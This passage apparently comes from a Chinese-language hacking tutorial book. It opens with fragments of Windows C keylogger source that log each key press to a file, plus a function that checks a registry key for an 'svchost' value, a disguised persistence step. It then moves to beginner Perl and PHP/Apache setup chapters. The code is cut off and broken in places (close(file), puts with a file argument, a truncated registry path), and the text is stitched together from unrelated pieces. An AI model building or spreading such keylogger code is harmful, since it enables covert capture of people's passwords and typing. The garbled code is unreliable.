
`case VK_CONTROL:`

`fputs("[CTRL]",file);`

`fclose(file);`

`break;`

`case VK_DELETE:`

`fputs("[DEL]",file);`

`fclose(file);`

`break;`

`case VK_OEM_1:`

```c
fputs("[::]",file);
fclose(file);
break;
```

`case VK_OEM_2:`

`fputs("[/?]",file);`

`fclose(file);`

`break;`

`case VK_OEM_3:`

`fputs("[^~]",file);`

`fclose(file);`

`break;`

`case VK_OEM_4:`

`fputs("[{ ]]",file);`

`fclose(file);`

`break;`

`case VK_OEM_5:`

`fputs("[\]]",file);`

```c
fclose(file);
break;
case VK_OEM_6:
fputs("[ ] ",file);
fclose(file);
break;
case VK_OEM_7:
fputs("\\");
```

```c
fputc('2',file);
fclose(file);
break;
case VK_NUMPAD3:
fputc('3',file);
fclose(file);
break;
case VK_NUMPAD4:
fputc('4',file);
fclose(file);
break;
case VK_NUMPAD5:
fputc('5',file);
fclose(file);
break;
case VK_NUMPAD6:
fputc('6',file);
```

```c
break;
case VK_NUMPAD7:
fputc('7',file);
close(file);
break;
case VK_NUMPAD8:
fputc('8',file);
close(file);
break;
case VK_NUMPAD9:
fputc('9',file);
close(file);
break;
case VK_CAPITAL:
puts("CAPS LOCK]",file);
close(file);
break;
default:
```

```c
fclose(file);
break;
}
}
}
}
}
return EXIT_SUCCESS;
}
```

```c
int test_key(void)
{
int check;
HKEY hKey;
char path[BUFSIZE];
DWORD buf_length=BUFSIZE;
int reg_key;
reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft
```

```c
if(reg_key!=0)
{
  check=1;
  return check;
}
reg_key=RegQueryValueEx(hKey,"svchost",NULL,NULL,path,&buf_length);
if((reg_key!=0)|(buf_length>BUFSIZE)){
  check=2;
}
if(reg_key==0)
{
  check=0;
  RegCloseKey(hKey);
}
```

具备此能力。当你运行任何脚本时，你需要声明一些变量来存储信息。Perl 中的变量与 Linux 中的变量相同，因此你应该像在 Linux 中一样声明它们，即在标签前加上一个“`$`”符号。

将以下代码输入文本编辑器中：

```perl
#!/usr/bin/perl
print "Welcome back, user!\n";
print "Which website do you want to use to hack?\n";
$name = <STDIN>;
chomp($name);
print "Thank you, $name is one of the websites I use too!\n";
```

让我们检查脚本中的每一行：

- 第一行将指示系统在执行脚本时，应该使用一个特定的脚本解释器。
- 第二行将在屏幕上打印一条语句。
- 第三行将在屏幕上打印该语句。
- 第四行将允许用户输入变量。
- 在代码的第五行中，`chomp` 函数将移除用户在回答问题时可能输入的换行符。
- 代码的最后一行将根据用户的输入打印你的响应。

## 第 6

你现在应该保存这个新脚本，并像之前处理脚本那样更改它的权限。最后，运行以下代码执行脚本：`./secondperlscript`。

## 第 32 章

## 使用 PHP 进行黑客

在本章中，你将学习如何使用 PHP 进行系统分析并收集信息以纠正任何问题。要编写本章中的程序，你需要以下内容：

- 文本编辑器
- 任何浏览器
- 带有 PHP 的 Apache Web 服务器

### 什么是 PHP？

PHP 是一种运行在服务器上的脚本语言。你在 PHP 中编写的代码将只在服务器上执行。客户端看不到代码，这就是为什么它是测试组织内部服务器或网络安全性的完美工具。

### 查找 IP 地址

在书中，我们将 IP 地址称为“yourip”。如果你在安装了 Apache 的同一系统上使用浏览器，你应该将 IP 地址替换为本地主机或“127.0.0.1”；否则，你需要知道本地 IP 地址是什么。为了找到它，你应该执行以下命令：

```bash
ifconfig | grep 'inet addr:'
```

IP 地址是跟在不包含地址“127.0.0.1”的所在行中，“inet addr:” 之后的数字字符串。

### 安装 Apache

如果你的系统中尚未安装 Apache，你应该运行以下命令进行安装：

```bash
sudo apt-get install apache2
```

当你运行命令时，系统会询问你是否要继续该过程，此时你应该选择“yes”。

## 确保 Apache 正常

打开浏览器并导航到链接：`http://yourip`。这应该带你进入 Apache2 Ubuntu 默认页面。你可以确认 Apache 是否存在。

### 安装 PHP

如果你想安装 PHP，应该运行以下命令：`sudo apt-get install php5 libapache2-mod-php5`。运行此命令时，系统会询问你是否要继续该过程；选择“yes”。

一旦安装 PHP，你需要重启 Apache 以确保 PHP 正常工作。运行以下命令重启 Apache：`sudo service apache2 restart`

## 确保 PHP 正常

创建一个名为“test.php”的文件并将其移动到 public 文件夹。你需要运行一些代码来确保 PHP 安装正确。你可以使用以下示例，它会在带有 PHP 版本的页面上返回“Hello User!”。

```php
//+--------------------------------------------------------------------
<?php
$version=phpversion(); // 将 $version 设置当前 PHP 版本
echo 'version: '.$version; // 在页面上打印 "version: x.x.x"
echo '<br/>'; // 在页面上打印换行
echo 'Hello User!'; // 在页面上打印 "Hello User!"
?>
//+----------------------------------------------------------------+
```
